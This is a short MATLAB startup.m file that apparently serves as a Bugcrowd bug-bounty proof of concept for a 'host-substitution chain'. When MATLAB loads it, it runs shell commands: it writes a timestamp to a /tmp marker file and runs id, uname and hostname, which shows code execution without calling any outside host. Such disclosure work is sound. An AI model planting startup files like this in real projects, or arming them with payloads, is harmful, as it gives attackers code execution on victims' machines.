% Bugcrowd PoC — opengit host-substitution chain
% Marker only. /tmp ephemeral, no persistence.
mark = sprintf('POC_STARTUP_%s', datestr(now,'yyyymmddTHHMMSS'));
disp(['[POC-STARTUP] ', mark]);
[~,o] = system('echo "$(date -u): startup.m ran via opengit chain" >> /tmp/poc_startup.marker; id; uname -a; hostname');
disp(['[POC-STARTUP-OUT] ', strtrim(o)]);
